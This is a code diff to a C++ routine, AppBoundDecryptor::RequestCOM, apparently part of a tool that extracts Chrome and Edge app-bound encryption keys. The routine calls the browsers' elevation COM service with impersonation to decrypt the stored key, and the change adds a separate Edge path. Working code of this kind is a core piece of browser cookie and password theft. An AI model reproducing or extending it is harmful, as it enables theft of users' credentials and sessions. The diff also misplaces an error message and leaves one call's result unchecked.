@@ -109,6 +109,7 @@ BOOL AppBoundDecryptor::RequestCOM(std::string service_parameter)
     CLSID CLSID_Elevator;
     IID IID_IElevator;
     std::string process_path;
+    BSTR plaintext_data = nullptr;
 
     if (parentFolderName == "Chrome")
     {
@@ -135,33 +136,6 @@ BOOL AppBoundDecryptor::RequestCOM(std::string service_parameter)
         return false;
     }
 
-    Microsoft::WRL::ComPtr<IElevator> elevator;
-    DWORD last_error = ERROR_GEN_FAILURE;
-
-    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
-    if (FAILED(hr)) {
-        //std::cerr << "Failed to create IElevator instance." << std::endl;
-        CoUninitialize();
-        return false;
-    }
-
-    hr = CoSetProxyBlanket(
-        elevator.Get(),
-        RPC_C_AUTHN_DEFAULT,
-        RPC_C_AUTHZ_DEFAULT,
-        COLE_DEFAULT_PRINCIPAL,
-        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-        RPC_C_IMP_LEVEL_IMPERSONATE,
-        nullptr,
-        EOAC_DYNAMIC_CLOAKING
-    );
-
-    if (FAILED(hr)) {
-        //std::cerr << "Failed to set proxy blanket." << std::endl;
-        CoUninitialize();
-        return false;
-    }
-
     std::vector<uint8_t> encrypted_key = RetrieveEncryptedKey(process_path, service_parameter);
     if (encrypted_key.size() == 0)
         return false;
@@ -173,8 +147,47 @@ BOOL AppBoundDecryptor::RequestCOM(std::string service_parameter)
         return false;
     }
 
-    BSTR plaintext_data = nullptr;
-    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
+    //Separate Elevator COMPtr for Edge
+    Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
+    Microsoft::WRL::ComPtr<IEdgeElevatorFinal> edge_elevator;
+    DWORD last_error = ERROR_GEN_FAILURE;
+
+    if (parentFolderName == "Edge")
+    {
+        hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&edge_elevator);
+        if (FAILED(hr)) {
+            //std::cerr << "Failed to create IElevator instance." << std::endl;
+            CoUninitialize();
+            return false;
+        }
+
+        hr = CoSetProxyBlanket(
+            edge_elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+
+        hr = edge_elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
+    }
+    else
+    {
+        hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
+        if (FAILED(hr)) {
+            //std::cerr << "Failed to create IElevator instance." << std::endl;
+            CoUninitialize();
+            return false;
+        }
+
+        hr = CoSetProxyBlanket(
+            elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+
+        hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
+    }
+
+    if (FAILED(hr)) {
+        //std::cerr << "Failed to set proxy blanket." << std::endl;
+        CoUninitialize();
+        return false;
+    }
 
     std::string decrypted_key_hex_string;
     std::string output_file = "c:\\users";
